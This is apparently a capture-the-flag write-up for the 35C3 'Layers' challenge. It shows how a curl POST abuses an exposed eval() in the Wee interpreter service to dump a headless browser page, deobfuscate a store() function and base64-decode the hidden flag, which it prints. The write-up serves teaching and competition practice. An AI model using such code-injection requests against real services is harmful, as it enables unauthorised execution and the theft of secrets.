# Layers

> Solves: 28

> An engineer added a special kind of token to our server: the LAYERS token is unique and there is no way to ever extract it. This means, if anybody every searches for it on the internet or submits it here, we know we have, like, a mole, or something. Dunno. Well we believe it cannot be extracted - so don't even bother.
> http://35.207.132.47/

> Difficulty estimate: Hard

This is one of the [Wee](../Wee) challenges.

## Analysis

The only mention of the `LAYERS` token can be found inside `weeterpreter.ts`.

```typescript
const pagePromise: Promise<puppeteer.Page> = new Promise(async (resolve, reject) => {
    try {
        const browser = await browserPromise
        const page = await browser.newPage()
        await page.setRequestInterception(true)
        page.on('request', r=> (r.url().startsWith("file://") && (
                r.url().endsWith("weelang/pypyjs.html") ||
                r.url().endsWith("lib/FunctionPromise.js") ||
                r.url().endsWith("lib/pypyjs.js") ||
                r.url().endsWith("lib/pypyjs.vm.js") ||
                r.url().endsWith("lib/pypyjs.vm.js.zmem")
            ) ? r.continue() : r.abort() && console.log("blocked", r.url()))
        )
        await page.goto(`file:///${__dirname}/pypyjs.html`, {waitUntil: 'networkidle2'})
        await page.evaluate(`store('${flags.LAYERS}')`)
        resolve(page)
    } catch (e) {
        reject(e)
    }
})
```

What is that `store()` function and what is all that `pypyjs` business? We can
find that out using the `eval()` function exposed in Wee. Let's see where that
takes us.

## Solution

```
liquid$> curl -X POST http://35.207.132.47/wee/run -d '{ "code": "alert(eval(\"document.documentElement.innerHTML\"))" }'
{"code":"alert(eval(\"document.documentElement.innerHTML\"))","result":"<head>\n    <title>Secure Python</title>\n    <meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\">\n    <meta charset=\"utf-8\">\n    <script src=\"node_modules/pypyjs/lib/FunctionPromise.js\" type=\"text/javascript\"></script>\n    <script src=\"node_modules/pypyjs/lib/pypyjs.js\" type=\"text/javascript\"></script>\n<script>\n\n
function py_eval(code) {\n        //console.log(\"exec: '\" + code + \"'\");\n        //console.log(\"pypy loaded\");\n        stdout = \"\"\n        stderr = \"\"\n        pypyjs.stdout = x => stdout += x\n
  pypyjs.stderr = x => stderr += x\n        try {\n            pypyjs.exec(`print(${code})`)\n            //console.log(\"Rsp:\", response)\n            return stdout + stderr\n        } catch (err) {\n //console.log(\"ERROR: \"+err.name+\": \"+err.message+\"!)\")\n            //console.log(err.trace); // the human-readable traceback, as a string\n            return stderr + err.trace\n        }\n    }\n\n    pypyjs.ready()\n\n    function store(x) {\n        var d = document\n        var _0x68de=[\"\\x62\\x74\\x6F\\x61\"]\n        var x=window[_0x68de[0]](x)\n        var _0x2d8a = [\n            \"\\x69\\x6E\\x6E\\x65\\x72\\x54\\x65\\x78\\x74\",\n            \"\\x66\\x75\\x6E\",\n            \"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\"\n        ]\n        d[_0x2d8a[2]](_0x2d8a[1])[_0x2d8a[0]] = x\n
   }\n\n    function store_py(x) {\n        py_eval(`x=${x}`)\n    }\n</script>\n</head>\n<body>\n<div id=\"fun\">MzVDM19IT1dfREVFUF9USEVfUkFCQklUX0hPTEVfR08zUw==</div>\n\n</body>\n"}
```

Not exacly pretty, is it? Let's format it nicer and unescape.

```html
<head>
    <title>Secure Python</title>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta charset="utf-8">
    <script src="node_modules/pypyjs/lib/FunctionPromise.js" type="text/javascript"></script>
    <script src="node_modules/pypyjs/lib/pypyjs.js" type="text/javascript"></script>
<script>


function py_eval(code) {
        //console.log("exec: '" + code + "'");
        //console.log("pypy loaded");
        stdout = ""
        stderr = ""
        pypyjs.stdout = x => stdout += x

  pypyjs.stderr = x => stderr += x
        try {
            pypyjs.exec(`print(${code})`)
            //console.log("Rsp:", response)
            return stdout + stderr
        } catch (err) {
 //console.log("ERROR: "+err.name+": "+err.message+"!)")
            //console.log(err.trace); // the human-readable traceback, as a string
            return stderr + err.trace
        }
    }

    pypyjs.ready()

    function store(x) {
        var d = document
        var _0x68de=["\x62\x74\x6F\x61"]
        var x=window[_0x68de[0]](x)
        var _0x2d8a = [
            "\x69\x6E\x6E\x65\x72\x54\x65\x78\x74",
            "\x66\x75\x6E",
            "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64"
        ]
        d[_0x2d8a[2]](_0x2d8a[1])[_0x2d8a[0]] = x

   }

    function store_py(x) {
        py_eval(`x=${x}`)
    }
</script>
</head>
<body>
<div id="fun">MzVDM19IT1dfREVFUF9USEVfUkFCQklUX0hPTEVfR08zUw==</div>

</body>
```

If we deobfuscate the `store` function we get:

```js
function store(x) {
  d.geElementById("fun").innerText = btoa(x)
}
```

This means that `#fun` contains our flag encoded with base64. We can decode it
easily:

```
liquid$> echo MzVDM19IT1dfREVFUF9USEVfUkFCQklUX0hPTEVfR08zUw== | base64 -d
35C3_HOW_DEEP_THE_RABBIT_HOLE_GO3S
```
